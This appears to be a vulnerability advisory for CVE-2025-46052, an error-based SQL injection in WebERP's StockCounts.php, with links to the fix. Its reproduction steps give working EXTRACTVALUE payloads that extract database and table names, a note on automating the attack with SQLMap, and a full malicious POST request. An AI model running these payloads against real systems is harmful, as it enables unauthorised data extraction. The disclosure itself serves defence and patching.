# CVE-2025-46052

---

## SQL Injection


An error-based SQL Injection (SQLi) vulnerability in WebERP v4.15.2 allows attackers to execute arbitrary SQL commands and extract sensitive data by injecting a crafted payload into the DEL form field within a POST request to /StockCounts.php

* Vulnerable Endpoint: /StockCounts.php
* Vulnerable Param: name
* Payload: 
```
8' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema='weberp' LIMIT 1 OFFSET 0)))--
```

---

## Fix

Vulnerable StockCounts.php:
https://github.com/timschofield/webERP/blob/5460e51b04a7efc2340303bcada4803523a34bfe/StockCounts.php#L357

Remediated StockCounts.php:
https://github.com/timschofield/webERP/pull/401/commits/f325591313977db991a3b361b0dc801cfc180274


---

### Steps to reproduce:

1.) Authenticate as Accountant user.

2.) Proceed to [http://localhost:8083/StockCounts.php](http://localhost:8083/StockCounts.php)

3.) View entered counts:
![[Pasted image 20250513102810.png]]
![[Pasted image 20250513102816.png]]

4.) Select Delete and intercept the request:
![[Pasted image 20250513102836.png]]

5.) Append a â€˜ and observe the database error:
![[Pasted image 20250513102849.png]]

6.) Use the following payload to get the database name via error based SQLi:

```
' AND EXTRACTVALUE(1,CONCAT(1,1,(MID((IFNULL(CAST(a() AS NCHAR),1)),1,1)),1)) AND '1'='1
```

![[Pasted image 20250513102911.png]]

7.) Use the following payload to get the table names within the weberp database by using the following payload:

```
8' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema='weberp' LIMIT 1 OFFSET 0)))--
```

![[Pasted image 20250513102935.png]]

```
8' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema='weberp' LIMIT 1 OFFSET 1)))--
```

![[Pasted image 20250513102952.png]]

8.) Automate this process with SQLMap:

![[Pasted image 20250513103007.png]]


---

### Vulnerable Request:

```
POST /StockCounts.php HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----geckoformboundaryd81c9974b5c6e982d498cb288f81b205
Content-Length: 689
Origin: http://localhost:8083
Connection: close
Referer: http://localhost:8083/StockCounts.php?&Action=View
Cookie: <cookie>
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundaryd81c9974b5c6e982d498cb288f81b205
Content-Disposition: form-data; name="FormID"

cf945861690e4c3e30286ce15ec036c814414b48
------geckoformboundaryd81c9974b5c6e982d498cb288f81b205
Content-Disposition: form-data; name="Action"

View
------geckoformboundaryd81c9974b5c6e982d498cb288f81b205
Content-Disposition: form-data; name="DEL[8' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema='weberp' LIMIT 1 OFFSET 0)))-- ]"

on
------geckoformboundaryd81c9974b5c6e982d498cb288f81b205
Content-Disposition: form-data; name="SubmitChanges"

Save Changes
------geckoformboundaryd81c9974b5c6e982d498cb288f81b205--
```






